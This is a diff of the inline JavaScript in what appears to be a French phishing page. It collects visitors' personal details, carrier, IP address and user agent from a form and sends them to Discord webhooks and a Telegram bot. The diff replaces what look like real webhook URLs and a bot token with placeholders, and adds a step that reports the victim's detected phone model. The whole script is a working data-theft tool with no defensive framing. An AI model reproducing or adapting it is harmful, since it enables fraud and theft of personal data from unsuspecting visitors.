@@ -83,16 +83,44 @@
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
-    const TELEGRAM_CHAT_ID = "-1002810249796";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_1";
+    const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_2";
+    const TELEGRAM_TOKEN = "TON_TOKEN_TELEGRAM";
+    const TELEGRAM_CHAT_ID = "TON_CHAT_ID";
+
+    function detectPhone(ua) {
+      ua = ua.toLowerCase();
+      if (ua.includes("iphone")) {
+        return {
+          name: "iPhone 16",
+          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/93cf8df0-767b-4323-a17d-0f01f5ce4b04-1_397f83c1-ffc4-4de0-bdfd-bb38a263a770.jpg"
+        };
+      } else if (ua.includes("android")) {
+        return {
+          name: "Samsung Galaxy",
+          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/3bd83a62-d359-44b0-b61d-481ae6f75710-1_4b547b9e-c5cb-4391-a422-227bab0ac5d2.jpg"
+        };
+      }
+      return null;
+    }
 
     async function sendDiscord(embed, webhookUrl) {
       return fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] }),
+      });
+    }
+
+    async function sendPhoneImage(webhookUrl, phoneInfo) {
+      if (!phoneInfo) return;
+
+      return fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `🔎 **Téléphone détecté : ${phoneInfo.name}**\n📸 ${phoneInfo.imageUrl}`
+        }),
       });
     }
 
@@ -119,32 +147,15 @@
       }
     }
 
-    // Detecte téléphone et retourne nom + image à mettre dans l'embed
-    function detectPhone(ua) {
-      ua = ua.toLowerCase();
-      if (ua.includes("iphone")) {
-        return {
-          name: "iPhone 16",
-          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/93cf8df0-767b-4323-a17d-0f01f5ce4b04-1_397f83c1-ffc4-4de0-bdfd-bb38a263a770.jpg"
-        };
-      } else if (ua.includes("android")) {
-        return {
-          name: "Samsung Galaxy",
-          imageUrl: "https://www.backmarket.fr/cdn-cgi/image/format%3Dauto%2Cquality%3D75%2Cwidth%3D1200/https://d2e6ccujb3mkqf.cloudfront.net/3bd83a62-d359-44b0-b61d-481ae6f75710-1_4b547b9e-c5cb-4391-a422-227bab0ac5d2.jpg"
-        };
-      }
-      return null;
-    }
-
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
       const msgElem = document.getElementById("msg");
       msgElem.textContent = "Envoi en cours...";
 
       const formData = new FormData(e.target);
-
       const ip = await getIP();
       const ua = navigator.userAgent || "Inconnu";
+      const phoneInfo = detectPhone(ua);
 
       const step2 = {
         nom: formData.get("nom"),
@@ -165,8 +176,6 @@
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
       }
-
-      const phoneInfo = detectPhone(ua);
 
       const discordEmbed = {
         title: "🍭 +1 Entrée 🍭",
@@ -197,15 +206,6 @@
         }
       };
 
-      if (phoneInfo) {
-        discordEmbed.thumbnail = { url: phoneInfo.imageUrl };
-        discordEmbed.fields.push({
-          name: "📱 Téléphone détecté",
-          value: phoneInfo.name,
-          inline: true
-        });
-      }
-
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
         `🚀 Nom : ${step2.nom}\n` +
@@ -224,10 +224,9 @@
         `🔎 User-Agent : ${ua}`;
 
       try {
-        await Promise.all([
-          sendDiscord(discordEmbed, webhookToUse),
-          sendTelegram(telegramText)
-        ]);
+        await sendDiscord(discordEmbed, webhookToUse);
+        await sendPhoneImage(webhookToUse, phoneInfo);
+        await sendTelegram(telegramText);
 
         msgElem.textContent = "Données envoyées avec succès ! Redirection...";
         localStorage.setItem("step2", JSON.stringify(step2));
